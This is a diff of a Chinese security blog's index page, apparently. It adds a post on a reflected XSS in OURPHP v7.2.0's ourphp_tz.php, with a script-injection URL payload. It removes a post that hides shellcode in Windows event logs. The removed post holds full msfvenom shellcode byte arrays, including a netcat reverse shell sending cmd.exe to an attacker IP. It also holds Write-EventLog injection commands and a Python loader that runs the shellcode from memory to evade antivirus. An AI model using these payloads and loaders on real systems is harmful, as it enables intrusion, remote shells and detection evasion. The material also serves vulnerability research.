@@ -255,6 +255,87 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/27/OURPHP-v7-2-0-ourphp-tz-php-Reflection-xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/27/OURPHP-v7-2-0-ourphp-tz-php-Reflection-xss/" class="post-title-link" itemprop="url">OURPHP  <=v7.2.0 ourphp_tz.php Reflection xss</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-27 08:31:39 / 修改时间：08:38:51" itemprop="dateCreated datePublished" datetime="2023-03-27T08:31:39+08:00">2023-03-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cve/" itemprop="url" rel="index"><span itemprop="name">-cve</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="OURPHP-lt-v7-2-0-ourphp-tz-php-Reflection-xss"><a href="#OURPHP-lt-v7-2-0-ourphp-tz-php-Reflection-xss" class="headerlink" title="OURPHP  &lt;=v7.2.0 ourphp_tz.php Reflection xss"></a>OURPHP  &lt;=v7.2.0 ourphp_tz.php Reflection xss</h1><p>This file appears to be a test file. If the website administrator does not delete it, there may be an xss vulnerability and some information leakage.<br>Later, I found that this file was also referenced in the background, so it is not a test file.</p>
+<p>By looking at line 619 of the code in the <code>/client/manage/ourphp_tz.php</code>file, we can see that.</p>
+<p><img src="/2023/03/27/OURPHP-v7-2-0-ourphp-tz-php-Reflection-xss/image-20230327082422258.png" alt="image-20230327082422258"></p>
+<p>If the get method passes in two parameters, an atc parameter with a value of rt and a parameter named callback, the page will directly echo the contents of our callback parameter.</p>
+<p>So payload is simple, as follows</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/client/manage/ourphp_tz.php?act=rt&amp;callback=&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Vulnerability-recurrence"><a href="#Vulnerability-recurrence" class="headerlink" title="Vulnerability recurrence"></a>Vulnerability recurrence</h2><p>Let’s download the code through the following link and install it directly in PHP Study.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://down.chinaz.com/api/index/download?id=51308&amp;type=code</span><br></pre></td></tr></table></figure>
+
+<p>After installation, directly access the following path</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/client/manage/ourphp_tz.php?act=rt&amp;callback=&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/27/OURPHP-v7-2-0-ourphp-tz-php-Reflection-xss/image-20230327083116827.png" alt="image-20230327083116827"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/26/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Joomla%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9ECVE-2023-23752/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -413,130 +494,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/" class="post-title-link" itemprop="url">巧用Windows事件日志隐藏载荷</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-03-17 21:19:20 / 修改时间：21:19:57" itemprop="dateCreated datePublished" datetime="2023-03-17T21:19:20+08:00">2023-03-17</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/miansha/" itemprop="url" rel="index"><span itemprop="name">-miansha</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="巧用Windows事件日志隐藏载荷"><a href="#巧用Windows事件日志隐藏载荷" class="headerlink" title="巧用Windows事件日志隐藏载荷"></a>巧用Windows事件日志隐藏载荷</h1><p>根据卡巴斯基发布的研究报告发现一项恶意活动，其中的技术涉及将shellcode直接放入Windows事件日志，Windows事件日志可以被攻击者用来掩盖特洛伊木马病毒的恶意使用。实现了”无文件”攻击技术.</p>
-<p>简单来说就是将shellcode放到windows的日志中去，然后后续只需要用加载器加载日志中的shellcode就可以实现分离免杀了。</p>
-<p>Windows事件日志文件实际上是以特定的数据结构的方式存储内容，每条记录事件的数据结构由9个字段组成，包括日志名称、来源、记录时间、事件ID、任务类别、级别、计算机、事件数据（EventData）等信息。其中事件数据<strong>仅支持消息和二进制数据</strong>。</p>
-<h1 id="写入日志"><a href="#写入日志" class="headerlink" title="写入日志"></a>写入日志</h1><p>那么怎么把数据写入日志文件中呢，powershell中设置了一条命令，帮助我们方便的将数据写入日志文件中。</p>
-<p>Write-EventLog命令可以将事件写入事件日志，参考微软官方文档，其中参数对应上面介绍的字段：</p>
-<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317181147969.png" alt="image-20230317181147969"></p>
-<p>执行命令：<code>Write-EventLog -LogName Application -Source VSS -EventID 65535 -EntryType Information -Category 0 -Message &quot;Hello World!&quot;</code></p>
-<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317181314533.png" alt="image-20230317181314533"></p>
-<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317181324210.png" alt="image-20230317181324210"></p>
-<p>可以看到日志文件中已经有了我们写入的日志信息。</p>
-<h1 id="弹计算器复现"><a href="#弹计算器复现" class="headerlink" title="弹计算器复现"></a>弹计算器复现</h1><h2 id="写入荷载"><a href="#写入荷载" class="headerlink" title="写入荷载"></a>写入荷载</h2><p>现在进行复现</p>
-<p>只需在Write-EventLog中使用-RawData参数，就可以在事件日志字段中包含二进制数据，而且必须将二进制数据作为字节数组传到-RawData参数中。我们可以将其包含数据的十六进制字符串转换为字节数组，然后再传递。</p>
-<p>首先，使用msfvenom生成弹计算器 payload。输出格式为十六进制字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec CMD=calc.exe -f hex </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317181847489.png" alt="image-20230317181847489"></p>
-<p><a target="_blank" rel="noopener" href="http://tools.bugscaner.com/text/hex2bytes.html">在线16进制字符串转bytes - 在线工具 (bugscaner.com)</a></p>
-<p>用工具转换</p>
-<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317182124892.png" alt="image-20230317182124892"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = [Byte[]](0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00)</span><br></pre></td></tr></table></figure>
-
-<p>使用密钥管理服务日志和KmsRequests作为源进行事件日志写入。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Write-EventLog -LogName &#x27;Key Management Service&#x27; -Source KmsRequests -EventID 9999 -EntryType Information -Category 0 -Message &quot;Hello World!&quot; -RawData $data</span><br></pre></td></tr></table></figure>
-
-<p>执行后，Payload已成功存储到事件日志当中。于事件日志的详细信息就能查看到。</p>
-<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317182436801.png" alt="image-20230317182436801"></p>
-<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317182459888.png" alt="image-20230317182459888"></p>
-<h2 id="执行荷载"><a href="#执行荷载" class="headerlink" title="执行荷载"></a>执行荷载</h2><p>为了提取并执行写入的载荷，这边用非常简单的C++程序和Python脚本进行证明（大佬的）</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/ldsaiyan/EventLogPersist">ldsaiyan/EventLogPersist: A Simple Proof Code for Extracting and Executing Shellcode from Event Logs (github.com)</a></p>
-<p>我这里也会在最后把代码贴出来(笑死我了，我刚把代码贴出来就报毒了，这速度也太快了。后面代码大家可以参照我以前的做做混淆算了)</p>
-<p>现在把python代码打包好上传到目标机器，然后执行。</p>
-<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317184607663.png" alt="image-20230317184607663"></p>
-<p>成功弹出计算器</p>
-<h1 id="反弹nc命令"><a href="#反弹nc命令" class="headerlink" title="反弹nc命令"></a>反弹nc命令</h1><p>但是这个上线是有大小限制的，我尝试生成msf的shellcode过大了，无法写入日志文件。</p>
-<p>所以我觉得可以尝试用nc来弄？</p>
-<p>反弹一个cmd出来</p>
-<p>攻击机nc监听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -lvvp 6666</span><br></pre></td></tr></table></figure>
-
-<p>目标机器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\nc.exe 192.168.75.1 6666 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
-
-<p>生成shellcode</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec CMD=&quot;C:\Users\24205\Desktop\netcat-win32-1.12\nc.exe 192.168.75.1 6666 -e c:\windows\system32\cmd.exe&quot; -f hex </span><br></pre></td></tr></table></figure>
-
-<h2 id="注入并执行荷载"><a href="#注入并执行荷载" class="headerlink" title="注入并执行荷载"></a>注入并执行荷载</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = [Byte[]](0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x43, 0x3A, 0x5C, 0x55, 0x73, 0x65, 0x72, 0x73, 0x5C, 0x32, 0x34, 0x32, 0x30, 0x35, 0x5C, 0x44, 0x65, 0x73, 0x6B, 0x74, 0x6F, 0x70, 0x5C, 0x6E, 0x65, 0x74, 0x63, 0x61, 0x74, 0x2D, 0x77, 0x69, 0x6E, 0x33, 0x32, 0x2D, 0x31, 0x2E, 0x31, 0x32, 0x5C, 0x6E, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x20, 0x31, 0x39, 0x32, 0x2E, 0x31, 0x36, 0x38, 0x2E, 0x37, 0x35, 0x2E, 0x31, 0x20, 0x36, 0x36, 0x36, 0x36, 0x20, 0x2D, 0x65, 0x20, 0x63, 0x3A, 0x5C, 0x77, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x63, 0x6D, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Write-EventLog -LogName &#x27;Key Management Service&#x27; -Source KmsRequests -EventID 9999 -EntryType Information -Category 0 -Message &quot;Hello World!&quot; -RawData $data</span><br></pre></td></tr></table></figure>
-
-<p>然后点击加载器,遂成功</p>
-<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317211809036.png" alt="image-20230317211809036"></p>
-<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><h2 id="用户限制"><a href="#用户限制" class="headerlink" title="用户限制"></a>用户限制</h2><p>事件日志的写入权限问题。为了能在事件日志条目中存储有效负载，我们拿到的权限必须要能写入日志。</p>
-<h2 id="大小限制"><a href="#大小限制" class="headerlink" title="大小限制"></a>大小限制</h2><p>需要注意的另一个限制是，事件日志中可以存储的数据量有大小限制。基于事件消息字符串的最大字符限制为31,839个字符。</p>
-<h2 id="更持久"><a href="#更持久" class="headerlink" title="更持久"></a>更持久</h2><p>在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\对应的日志名称下的条目中，存在一个EventMessageFile属性。如果在注入载荷的时候，事件ID不存在于该属性指定的源关联的事件消息文件中，则会出现下图这个日志消息：</p>
-<p><img src="/2023/03/17/%E5%B7%A7%E7%94%A8Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E9%9A%90%E8%97%8F%E8%BD%BD%E8%8D%B7/image-20230317192555763.png" alt="image-20230317192555763"></p>
-<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> win32evtlog</span><br><span class="line"></span><br><span class="line">server = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">logtype = <span class="string">&#x27;Key Management Service&#x27;</span></span><br><span class="line">hand = win32evtlog.OpenEventLog(server, logtype)</span><br><span class="line">flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ</span><br><span class="line">total = win32evtlog.GetNumberOfEventLogRecords(hand)</span><br><span class="line">switch = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">shellcode</span>):</span></span><br><span class="line">    shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line">    <span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line">    ctypes .windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">    buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">        ctypes.c_uint64(ptr),</span><br><span class="line">        buf,</span><br><span class="line">        ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">        ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">        ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">        ctypes.c_uint64(ptr),</span><br><span class="line">        ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">        ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">        ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    events = win32evtlog.ReadEventLog(hand, flags, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> events:</span><br><span class="line">        <span class="keyword">for</span> event <span class="keyword">in</span> events:</span><br><span class="line">            <span class="built_in">print</span>(event.Data)</span><br><span class="line">            <span class="keyword">if</span> event.Data:</span><br><span class="line">                switch = calc(event.Data)</span><br><span class="line">    <span class="keyword">if</span> switch:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -608,7 +565,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-count">174</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
